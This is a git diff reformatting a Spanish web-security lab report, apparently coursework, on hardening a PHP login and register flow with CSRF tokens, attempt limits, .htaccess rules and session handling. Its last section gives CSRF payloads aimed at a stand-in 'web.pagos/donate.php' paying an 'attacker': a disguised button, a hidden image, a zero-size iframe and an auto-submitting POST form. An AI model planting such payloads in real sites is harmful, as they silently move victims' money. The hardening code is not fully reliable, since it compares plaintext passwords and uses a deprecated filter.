@@ -218,42 +218,103 @@ $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 
    Un cambio en la comparación de contraseñas, que podemos implementar añadiendo:
 
-   |<p>if ($password === $row['password']) {</p><p>`    `$\_SESSION['userId'] = $row['userId'];</p><p>`    `$\_SESSION['username'] = $user;</p><p>`    `$\_SESSION['last\_activity'] = time();</p><p>`    `return TRUE;</p><p>} else {</p><p>`    `return FALSE;</p><p>}</p>|
-   | :- |
+```
+if ($password === $row['password']) {
+    $_SESSION['userId'] = $row['userId'];
+    $_SESSION['username'] = $user;
+    $_SESSION['last_activity'] = time();
+    return TRUE;
+} else {
+    return FALSE;
+}
+```
 
    Iniciación de las variables antes del bloque de login:
 
-   |<p>$login\_ok = FALSE;</p><p>$error = "";</p>|
-   | :- |
+```
+$login_ok = FALSE;
+$error = "";
+```
 
    Añadimos una verificación de existencia del token CSRF.
 
-   |<p>if ($\_SERVER['REQUEST\_METHOD'] === 'POST' && isset($\_POST['username']) && isset($\_POST['password'])) {</p><p>`    `if ($\_SESSION['login\_attempts'] >= 5) {</p><p>`        `$error = "Demasiados intentos fallidos. Por favor, inténtelo más tarde.";</p><p>`    `} elseif (!isset($\_POST['csrf\_token']) || !verifyCSRFToken($\_POST['csrf\_token'])) {</p><p>`        `$error = "Token CSRF inválido.";</p><p>`    `} else {</p><p>`        `if (areUserAndPasswordValid($\_POST['username'], $\_POST['password'])) {</p><p>`            `$login\_ok = TRUE;</p><p>`            `$\_SESSION['login\_attempts'] = 0;</p><p>`        `} else {</p><p>`            `$login\_ok = FALSE;</p><p>`            `$\_SESSION['login\_attempts']++;</p><p>`            `$error = "Usuario o contraseña inválidos.";</p><p>`        `}</p><p>`    `}</p><p>}</p>|
-   | :- |
+```
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
+    if ($_SESSION['login_attempts'] >= 5) {
+        $error = "Demasiados intentos fallidos. Por favor, inténtelo más tarde.";
+    } elseif (!isset($_POST['csrf_token']) || !verifyCSRFToken($_POST['csrf_token'])) {
+        $error = "Token CSRF inválido.";
+    } else {
+        if (areUserAndPasswordValid($_POST['username'], $_POST['password'])) {
+            $login_ok = TRUE;
+            $_SESSION['login_attempts'] = 0;
+        } else {
+            $login_ok = FALSE;
+            $_SESSION['login_attempts']++;
+            $error = "Usuario o contraseña inválidos.";
+        }
+    }
+}
+```
 
    Cambio en la ruta del CSS para reflejar la posible ubicación del archivo auth.php en una subcarpeta.
 
-   |<link rel="stylesheet" href="../css/style.css">|
-   | :- |
+```
+<link rel="stylesheet" href="../css/style.css">
+```
 
    **c)** Volvemos a la página de register.php, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.
 
    La opción mas sencilla que podríamos implementar, es deshabilitar el acceso público a register.php, de modo que quedara totalmente inaccesible, para lo que añadiríamos:
+   
+```
+header("Location: index.php");
+exit();
+```
 
-   |<p>header("Location: index.php");</p><p>exit();</p>|
-   | :- |
 
    Otras opciones que podríamos implementar es el uso de roles para usuarios, de modo que solo pudieran acceder a register.php los usuarios con un determinado rol, como por ejemplo, administrador. En nuestro caso, no podríamos hacerlo, ya que la base de datos en la tabla users no contiene un campo para almacenar los roles de los usuarios, pero en caso de que se pudiera crear ese campo, para implementar este sistema de roles, deberíamos cambiar lo siguiente:
 
-   |<p>Añadir en el formulario un campo para seleccionar los roles:</p><p></p><p><select name="user\_role" id="user\_role"></p><p>`    `<option value="user">Usuario</option></p><p>`    `<option value="admin">Administrador</option></p><p></select></p><p></p><p>Modificar todo el proceso de registro para integrar el rol seleccionado:</p><p></p><p>if(isset($\_POST['register'])) {</p><p>`    `$username = $\_POST['username'];</p><p>`    `$password = password\_hash($\_POST['password'], PASSWORD\_DEFAULT);</p><p>`    `$role = $\_POST['user\_role'];</p><p>    </p><p>`    `$query = "INSERT INTO users (username, password, role) VALUES (?, ?, ?)";</p><p>`    `$stmt = $db->prepare($query);</p><p>`    `$stmt->bind\_param("sss", $username, $password, $role);</p><p>`    `$stmt->execute();</p><p>}</p><p></p><p>Almacenar el rol en la sesión:</p><p></p><p>if($user = $stmt->fetch()) {</p><p>`    `$\_SESSION['user\_id'] = $user['id'];</p><p>`    `$\_SESSION['username'] = $user['username'];</p><p>`    `$\_SESSION['user\_role'] = $user['role'];</p><p>}</p>|
-   | :- |
+```
+Añadir en el formulario un campo para seleccionar los roles:
+
+<select name="user_role" id="user_role">
+    <option value="user">Usuario</option>
+    <option value="admin">Administrador</option>
+</select>
+
+Modificar todo el proceso de registro para integrar el rol seleccionado:
+
+if(isset($_POST['register'])) {
+    $username = $_POST['username'];
+    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
+    $role = $_POST['user_role'];
+
+    $query = "INSERT INTO users (username, password, role) VALUES (?, ?, ?)";
+    $stmt = $db->prepare($query);
+    $stmt->bind_param("sss", $username, $password, $role);
+    $stmt->execute();
+}
+
+Almacenar el rol en la sesión:
+
+if($user = $stmt->fetch()) {
+    $_SESSION['user_id'] = $user['id'];
+    $_SESSION['username'] = $user['username'];
+    $_SESSION['user_role'] = $user['role'];
+}
+```
+
 
    **d)** Al comienzo de la práctica hemos supuesto que la carpeta private no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?
 
    Si, podemos acceder a los archivos contenidos dentro de private. Para evitar el acceso a ese contenido, podemos crear dentro del directorio private, un archivo con nombre .htaccess y con el siguiente contenido:
 
-   |<p>Order Deny,Allow</p><p>Deny from all</p>|
-   | :- |
+```
+Order Deny,Allow
+Deny from all
+```
+
 
    De este modo, se denegará el acceso a todos los usuarios que intenten acceder al contenido desde el navegador.
 
@@ -261,8 +322,10 @@ $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 
    También podríamos cambiar los permisos al directorio, para que no hubiera acceso al mismo, lo podríamos hacer aplicando:
 
-   |<p>chmod 750 private</p><p>chmod 640 private/\*</p>|
-   | :- |
+```
+chmod 750 private
+chmod 640 private/*
+```
 
    Si necesitáramos acceso de determinados usuarios, podríamos configurar una autenticación básica basada en HTML usando .htaccess y .htpasswd
 
@@ -272,18 +335,35 @@ $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 
    Regeneración del ID de sesión después del login:
 
-   |session\_regenerate\_id(true);|
-   | :- |
+```
+session_regenerate_id(true);
+```
 
    Mejorar la limpieza de sesión en el logout:
 
-   |<p>function logout() {</p><p>`    `$\_SESSION = array();</p><p>`    `if (ini\_get("session.use\_cookies")) {</p><p>`        `$params = session\_get\_cookie\_params();</p><p>`        `setcookie(session\_name(), '', time() - 42000,</p><p>`            `$params["path"], $params["domain"],</p><p>`            `$params["secure"], $params["httponly"]</p><p>`        `);</p><p>`    `}</p><p>`    `session\_destroy();</p><p>}</p>|
-   | :- |
+```
+function logout() {
+    $_SESSION = array();
+    if (ini_get("session.use_cookies")) {
+        $params = session_get_cookie_params();
+        setcookie(session_name(), '', time() - 42000,
+            $params["path"], $params["domain"],
+            $params["secure"], $params["httponly"]
+        );
+    }
+    session_destroy();
+}
+```
 
    Implementar una validación de entradas mas robusta:
 
-   |<p>$username = filter\_input(INPUT\_POST, 'username', FILTER\_SANITIZE\_STRING);</p><p>if (!$username || strlen($username) < 3 || strlen($username) > 20) {</p><p>`    `$error = "Nombre de usuario inválido";</p><p>}</p>|
-   | :- |
+```
+$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
+if (!$username || strlen($username) < 3 || strlen($username) > 20) {
+    $error = "Nombre de usuario inválido";
+}
+```
+
 1. ### **4. Servidores web**
    ¿Qué medidas de seguridad se implementaríais en el servidor web para reducir el riesgo a ataques?
 
@@ -300,21 +380,40 @@ $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 
    a) Editad un jugador para conseguir que, en el listado de jugadores list\\_players.php aparezca, debajo del nombre de su equipo y antes de show/add comments un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.
 
-   |En el campo...|<p>`                    `<div></p><p>`                    `<a href=\"show\_comments.php?id=".$row['playerid']."\">(show/add comments)</a></p><p>`                    `<a href=\"insert\_player.php?id=".$row['playerid']."\">(edit player)</a></p><p>`                    `</div></p><p>`                    `</li>\n";</p><p>`            `}</p>|
-   | :- | :- |
-   |Introduzco...|<p><form action='http://web.pagos/donate.php' method='get' style='display:inline;'></p><p>`        `<input type='hidden' name='amount' value='100'></p><p>`        `<input type='hidden' name='receiver' value='attacker'></p><p>`        `<input type='submit' value='Profile' style='cursor:pointer;'></p><p>`      `</form>";</p>|
+| En el campo... | 
+| --------------- | 
+| <div> |
+|     <a href="show_comments.php?id=".$row['playerid'].">(show/add comments)</a> |
+|     <a href="insert_player.php?id=".$row['playerid'].">(edit player)</a> |
+| </div> |
+| </li> |
+| } |
+
+| Introduzco... |
+| --------------- |
+| <form action='http://web.pagos/donate.php' method='get' style='display:inline;'> |
+|     <input type='hidden' name='amount' value='100'> |
+|     <input type='hidden' name='receiver' value='attacker'> |
+|     <input type='submit' value='Profile' style='cursor:pointer;'> |
+| </form> |
+
 
    **b)** Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que el usuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show\_comments.php).
 
    Podríamos hacerlo de varias formas, una de ellas sería incluyendo en el comentario una imagen oculta, que cargue la URL de donación de manera silenciosa cuando se abra el comentario, un ejemplo podría ser:
 
-   |<p>Sin duda el mejor jugador de todos los tiempos!</p><p><img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;" /></p>|
-   | :- |
+```
+<p>Sin duda el mejor jugador de todos los tiempos!</p>
+<p><img src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="display:none;" /></p>
+```
+
 
    Otra opción podría ser incluir en el comentario un iframe, que haga lo mismo que antes ha hecho la imagen, un ejemplo sería:
 
-   |<p>Sin duda el mejor jugador de todos los tiempos!</p><p><iframe src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="width:0;height:0;border:0; border:none;"></iframe></p>|
-   | :- |
+```
+<p>Sin duda el mejor jugador de todos los tiempos!</p>
+<p><iframe src="http://web.pagos/donate.php?amount=100&receiver=attacker" style="width:0;height:0;border:0; border:none;"></iframe></p>
+```
 
    **c)** Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.
 
@@ -328,7 +427,15 @@ $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
 
    Un ejemplo de mensaje malicioso que realice un ataque CSRF usando POST en lugar de GET podría ser:
 
-   |<p>Sin duda el mejor jugador de todos los tiempos!</p><p><iframe style="display:none" name="csrf-frame"></iframe></p><p><form action="http://web.pagos/donate.php" method="POST" target="csrf-frame" id="csrf-form"></p><p>`  `<input type="hidden" name="amount" value="100"></p><p>`  `<input type="hidden" name="receiver" value="attacker"></p><p></form></p><p><script>document.getElementById("csrf-form").submit();</script></p>|
-   | :- |
+```
+<p>Sin duda el mejor jugador de todos los tiempos!</p>
+<p><iframe style="display:none" name="csrf-frame"></iframe></p>
+<p><form action="http://web.pagos/donate.php" method="POST" target="csrf-frame" id="csrf-form">
+    <input type="hidden" name="amount" value="100">
+    <input type="hidden" name="receiver" value="attacker">
+</form></p>
+<p><script>document.getElementById("csrf-form").submit();</script></p>
+```
+
 
    Este mensaje, crea un formulario, que se envía de manera silenciosa cuando el usuario accede al comentario, en este caso, usando POST en lugar de GET.
